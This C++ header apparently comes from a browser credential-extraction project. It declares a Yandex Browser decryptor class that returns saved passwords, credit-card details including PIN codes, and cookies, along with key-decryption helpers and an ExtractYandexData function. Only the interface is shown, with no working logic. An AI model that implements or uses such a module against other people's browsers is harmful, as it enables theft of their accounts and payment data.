//yandex_module.h
// github: github.com/s4yr3x
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#pragma once

#include <string>
#include "../../../libs/sqlite/sqlite3.h"
#include <nlohmann/json.hpp>

struct decrypted_password_t
{
  std::string url;
  std::string username;
  std::string password;
};

struct decrypted_cc_t
{
  std::string card_number;
  std::string pin_code;
  std::string secret_comment;
  std::string card_holder;
  std::string card_title;
  std::string expire_date_year;
  std::string expire_date_month;
};

struct decrypted_cookie_t {
    std::string host;
    std::string name;
    std::string value;
    std::string path;
    bool secure;
    bool httpOnly;
    bool hostOnly;
    bool session;
    std::string storeId;
    double expirationDate;
    int id;
};

struct Cookie {
    std::string domain;
    double expirationDate;
    bool hostOnly;
    bool httpOnly;
    int id;
    std::string name;
    std::string path;
    bool secure;
    bool session;
    std::string storeId;
    std::string value;
};

class YaDecryptor
{
public:
  YaDecryptor(const char *user_data_path, const char *profile_name = "Default");
  ~YaDecryptor();

  void init();

  std::vector<decrypted_password_t> get_passwords();
  std::vector<decrypted_cc_t> get_credit_cards();
  std::vector<decrypted_cookie_t> get_cookies();

private:
  std::string decrypt_ls_key(std::string &key_base64);
  std::string get_le_key(sqlite3 *db_ctx);
  std::string get_le_key1();

  std::string _user_data_path;
  std::string _profile_name;

  std::string _local_state_path;

  std::string _profile_path;
  std::string _passwords_path;
  std::string _cards_path;
  std::string _cookies_path;

  std::string _ls_key;
  std::string _le_key;
};

void ExtractYandexData();